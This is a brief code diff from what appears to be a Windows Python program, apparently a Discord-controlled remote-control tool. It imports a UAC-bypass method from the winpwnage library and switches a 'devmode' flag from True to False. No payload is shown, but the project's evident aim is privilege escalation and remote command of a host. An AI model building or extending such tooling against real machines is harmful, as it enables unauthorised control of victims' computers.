@@ -19,7 +19,7 @@ from winpwnage.functions.uac.uacMethod1 import uacMethod1
 os.system('cls')
 pc = Info()
 PREFIX = '>'
-devmode = True
+devmode = False
 config = LoadsConfig()
 client = commands.Bot(command_prefix=commands.when_mentioned_or(PREFIX), intents = discord.Intents.all(), help_command=PrettyHelp())
 
